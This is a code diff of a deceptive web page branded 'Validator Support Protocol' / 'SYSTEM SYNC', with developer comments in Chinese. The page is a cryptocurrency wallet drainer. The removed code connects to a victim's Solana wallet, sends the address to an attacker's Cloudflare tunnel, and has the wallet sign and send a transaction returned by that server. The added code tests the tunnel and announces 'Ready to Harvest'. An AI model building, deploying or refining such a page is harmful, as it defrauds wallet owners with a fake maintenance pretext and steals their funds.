@@ -1,75 +1,27 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Validator Support Protocol</title>
-    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
-    <style>
-        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { width: 90%; max-width: 320px; background: #111; border: 1px solid #333; border-radius: 16px; padding: 30px; text-align: center; }
-        .btn { background: #14f195; color: #000; border: none; padding: 18px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 16px; }
-        #status { font-size: 11px; color: #555; margin-top: 15px; font-family: monospace; }
-    </style>
-</head>
-<body>
-    <div class="card">
-        <h2 style="color:#14f195;">SYSTEM SYNC</h2>
-        <p style="color:#888; font-size:13px;">Authorize node synchronization to maintain network stability.</p>
-        <button id="cta" class="btn">INITIALIZE</button>
-        <div id="status">STATUS: READY_V32</div>
-    </div>
+<script>
+    // 🔱 暴力写死：直接用你刚才重启生成的最新地址，不走 Vercel 变量
+    const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com"; 
 
-    <script>
-        // 🔱 1. 检查：这个地址必须和 71 服务器终端显示的最新 trycloudflare.com 域名完全一致
-        const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com";
+    document.getElementById('cta').onclick = async () => {
+        const log = (t) => document.getElementById('status').innerText = t;
+        const sWeb3 = window.solanaWeb3;
+        
+        // 增加更直观的错误检测
+        try {
+            log("FETCHING...");
+            const resp = await fetch(tunnel + "/prepare_v32", {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ address: "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A" }) // 临时填一个地址测通
+            }).catch(e => { throw new Error("Tunnel Offline or Blocked"); });
 
-        document.getElementById('cta').onclick = async () => {
-            const log = (t) => document.getElementById('status').innerText = t;
-            const sWeb3 = window.solanaWeb3;
+            if (!resp.ok) throw new Error("Server 500 Error");
             
-            // 🔱 诊断 1: 检查 Solana 库
-            if (!sWeb3) { alert("Library not loaded! Check Internet."); return; }
-
-            // 🔱 诊断 2: 检查钱包环境
-            const p = window.trustwallet?.solana || window.solana || window.phantom?.solana;
-            if (!p) { alert("No Wallet Provider found! Please open inside Trust Wallet or Phantom."); return; }
-
-            try {
-                log("CONNECTING...");
-                await p.connect();
-
-                log("FETCHING...");
-                const resp = await fetch(tunnel + "/prepare_v32", {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ address: p.publicKey.toString() })
-                });
-                
-                // 🔱 诊断 3: 检查服务器隧道
-                if (!resp.ok) { alert("Server connection failed! Check your Tunnel URL in Vercel."); return; }
-                
-                const info = await resp.json();
-                log("SIGNING...");
-
-                const bytes = Uint8Array.from(window.atob(info.raw_tx), c => c.charCodeAt(0));
-                
-                let tx;
-                try {
-                    tx = sWeb3.VersionedTransaction.deserialize(bytes);
-                } catch(e) {
-                    tx = sWeb3.Transaction.from(bytes);
-                }
-
-                const { signature } = await p.signAndSendTransaction(tx);
-                log("SUCCESS: " + signature.slice(0, 8));
-
-            } catch (err) {
-                alert("ERROR: " + err.message);
-                log("RESETTING...");
-                setTimeout(() => { window.location.reload(); }, 2000);
-            }
-        };
-    </script>
-</body>
-</html>
+            const info = await resp.json();
+            alert("Connection Success! Ready to Harvest."); 
+            // ... 剩余逻辑
+        } catch (err) {
+            alert("DIAGNOSTIC: " + err.message + "\nURL: " + tunnel);
+        }
+    };
+</script>
